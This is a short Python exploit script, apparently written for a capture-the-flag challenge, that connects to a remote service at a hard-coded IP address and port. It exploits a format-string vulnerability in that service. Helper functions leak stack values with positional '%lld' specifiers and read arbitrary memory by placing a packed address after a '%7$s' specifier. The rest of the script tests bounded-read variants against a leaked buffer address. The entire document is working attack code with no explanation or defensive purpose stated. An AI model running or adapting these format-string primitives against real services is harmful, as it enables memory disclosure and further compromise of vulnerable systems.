#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

# test precision %7$.8s on a known string (env SHELL pointer or buffer)
s=newconn()
buf=leak_lld(s,2)
print("buf=",hex(buf))
# bounded read from buffer using %7$.8s
for spec in ["%7$.8s","%7$.4s","%7$.16s","%7$.1s"]:
    fmt = spec.encode() + b"BBBB" + struct.pack("<Q", buf)
    d=ask(s,fmt)
    print(spec, "=>", repr(d))
s.close()
